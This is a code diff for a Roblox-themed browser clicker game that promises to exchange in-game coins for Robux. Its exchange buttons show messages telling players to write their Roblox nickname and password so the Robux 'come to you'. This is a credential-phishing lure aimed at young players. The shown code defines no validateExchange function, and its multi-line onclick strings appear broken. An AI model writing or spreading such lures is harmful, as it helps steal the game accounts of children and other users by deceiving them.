@@ -8,7 +8,10 @@
         body { background: #0a0f1e; color: #fff; font-family: 'Segoe UI', sans-serif; display: flex; justify-content: center; padding: 20px; margin: 0; }
         .game-container { max-width: 500px; width: 100%; }
         .stats { display: flex; justify-content: space-around; background: #151e2c; padding: 20px; border-radius: 20px; margin-bottom: 20px; border: 1px solid #2a3b4e; }
+        
         .robux-container { text-align: center; margin: 20px 0; background: transparent; }
+        
+        /* Видалення ефектів натискання (синє скло) */
         .robux-img { 
             width: 220px; 
             cursor: pointer; 
@@ -19,10 +22,13 @@
             -webkit-user-select: none;
         }
         .robux-img:active { transform: scale(0.96); }
+        
         .section-title { color: #ffcc66; margin: 25px 0 10px; font-weight: bold; text-transform: uppercase; }
         .upgrade-card { background: #1c2838; padding: 15px; border-radius: 15px; margin-bottom: 10px; display: flex; justify-content: space-between; align-items: center; border: 1px solid #2a3b4e; }
+        
         button { background: #ffcc66; border: none; padding: 10px 18px; border-radius: 10px; font-weight: bold; cursor: pointer; color: #000; }
         button:disabled { background: #444 !important; color: #aaa !important; cursor: not-allowed; }
+        .owned-state { background: #444 !important; color: #aaa !important; cursor: default; }
     </style>
 </head>
 <body>
@@ -34,7 +40,7 @@
     </div>
 
     <div class="robux-container">
-        <img src="https://i.imgur.com/8QoP99b.png" class="robux-img" id="clickableRobux">
+        <img src="https://i.ibb.co/L6QyD5F/robux.png" class="robux-img" id="clickableRobux">
     </div>
 
     <div id="powerUpgradesList"></div>
@@ -46,22 +52,39 @@
     </div>
 
     <div class="section-title">💎 ROBUX EXCHANGE</div>
-    <div class="upgrade-card"><div>50k 💰 → 160 💎</div><button id="pack1" onclick="alert('Nick Roblox:\nPassword Roblox:')">EXCHANGE</button></div>
-    <div class="upgrade-card"><div>100k 💰 → 360 💎</div><button id="pack2" onclick="alert('Nick Roblox:\nPassword Roblox:')">EXCHANGE</button></div>
-    <div class="upgrade-card"><div>200k 💰 → 800 💎</div><button id="pack3" onclick="alert('Nick Roblox:\nPassword Roblox:')">EXCHANGE</button></div>
+    <div class="upgrade-card"><div>50k 💰 → 160 💎</div><button id="pack1" onclick="validateExchange(50000, '👑Okay, you bought 160 Robux, here's what you need to write so they come to you:
+
+Nick Roblox:
+Password Roblox:')">EXCHANGE</button></div>
+    <div class="upgrade-card"><div>100k 💰 → 360 💎</div><button id="pack2" onclick="validateExchange(100000, '👑Okay, you bought 360 Robux, here's what you need to write so they come to you:
+
+Nick Roblox:
+Password Roblox:')">EXCHANGE</button></div>
+    <div class="upgrade-card"><div>200k 💰 → 800 💎</div><button id="pack3" onclick="validateExchange(200000, '👑Okay, you bought 800 Robux, here's what you need to write so they come to you:
+
+Nick Roblox:
+Password Roblox:')">EXCHANGE</button></div>
 </div>
 
 <script>
-    let state = { coins: 0, energy: 10, maxEnergy: 10 };
+    let state = { coins: 0, energy: 10, maxEnergy: 10, tapLvl: 0, hasMiner: false };
+    const powerCosts = [100, 200, 500];
+
+    function loadGame() {
+        const saved = localStorage.getItem('robcoinData');
+        if (saved) state = JSON.parse(saved);
+    }
+
+    function saveGame() {
+        localStorage.setItem('robcoinData', JSON.stringify(state));
+    }
 
     function updateUI() {
         document.getElementById('robuxAmount').innerText = Math.floor(state.coins);
-        document.getElementById('energyDisplay').innerText = state.energy + "/" + state.maxEnergy;
+        document.getElementById('energyDisplay').innerText = `${Math.floor(state.energy)}/${state.maxEnergy}`;
     }
-
-    // Додай сюди свою логіку натискань, якщо вона була нижче
-    updateUI();
 </script>
 </body>
 </html>
+
 
